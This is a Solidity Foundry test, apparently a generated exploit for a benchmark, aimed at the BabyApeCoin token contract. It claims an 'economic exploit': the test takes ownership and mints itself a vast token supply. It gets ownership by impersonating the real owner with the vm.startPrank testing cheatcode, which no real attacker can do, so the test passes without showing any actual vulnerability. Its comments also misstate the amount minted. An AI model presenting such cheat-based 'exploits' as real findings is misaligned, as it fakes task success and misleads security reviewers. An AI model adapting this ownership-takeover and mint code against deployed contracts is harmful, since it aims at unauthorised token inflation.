// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BabyApeCoin {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function mint(address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll interact directly with the deployed contract
        // The test template already defines TARGET and attacker = address(this)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));

        // Get the current owner
        address currentOwner = BabyApeCoin(TARGET).owner();

        // Impersonate the current owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        BabyApeCoin(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Verify we are now the owner
        require(BabyApeCoin(TARGET).owner() == attacker, "Failed to become owner");

        // Record initial balance
        uint256 initialTokenBalance = BabyApeCoin(TARGET).balanceOf(attacker);

        // Mint a large amount of tokens to ourselves (e.g., 1 million tokens)
        // Using the same amount that was minted in constructor: 10000 * 10**6 * 10**18
        uint256 mintAmount = 10000 * 10**6 * 10**18;
        BabyApeCoin(TARGET).mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalTokenBalance = BabyApeCoin(TARGET).balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Balance did not increase");

        uint256 finalERC20Balance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
